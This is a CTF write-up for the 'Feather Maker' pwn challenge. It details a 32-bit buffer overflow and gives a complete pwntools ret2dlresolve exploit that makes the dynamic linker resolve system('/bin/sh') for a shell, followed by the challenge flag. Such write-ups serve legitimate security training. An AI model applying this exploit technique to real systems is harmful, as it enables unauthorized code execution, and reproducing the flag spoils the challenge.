---
title: "Feather Maker"
description: "32-bit ret2dlresolve — Partial RELRO, NX on, no libc leak, only read@plt. Force the linker to resolve system(\"/bin/sh\")."
event: "V1T CTF"
year: 2025
category: pwn
tags: ["32-bit", "ret2dlresolve", "rop", "pwntools"]
difficulty: medium
date: "2025-08-10"
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "v1tctf/pwn/Feather Maker"
featured: true
flagsHidden: false
---

## Recon

```bash
$ file chall
chall: ELF 32-bit LSB executable, dynamically linked, not stripped

$ checksec --file=./chall
RELRO: Partial RELRO   Canary: No   NX: enabled   PIE: No PIE
```

Decompiled `vuln`:

```c
void vuln(void) {
    char buf[304];       // 0x130
    read(0, buf, 0x15e); // 350 bytes → overflow
    return;
}
```

Only useful import: `read`. No `system`, no `puts`, no leak. Classic
textbook `ret2dlresolve`.

## Offset

304 buf + 4 saved EBP + 4 saved EIP → **0x138**.

## Strategy

1. Overflow. Use `read@plt` to write the fake resolver structures into `.bss`.
2. Trigger the dynamic linker resolver with `"system"` + `"/bin/sh"`.
3. Second send delivers the actual dlresolve payload.

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall')
context.arch = 'i386'
context.os = 'linux'

HOST, PORT = 'chall.v1t.site', 30212

def start():
    return remote(HOST, PORT) if args.REMOTE else process(elf.path)

p = start()

offset = 0x138
bss_addr = elf.bss() + 0x500

dlresolve = Ret2dlresolvePayload(
    elf,
    symbol='system',
    args=['/bin/sh'],
    data_addr=bss_addr,
)

rop = ROP(elf)
rop.call(elf.plt['read'], [0, bss_addr, len(dlresolve.payload)])
rop.ret2dlresolve(dlresolve)

payload = flat(b'A' * offset, rop.chain())
p.send(payload)
p.send(dlresolve.payload)
p.interactive()
```

## Flag

```text
V1T{f34th3r_r3dr1r_3a5f1b52344f42ccd459c8aa13487591}
```
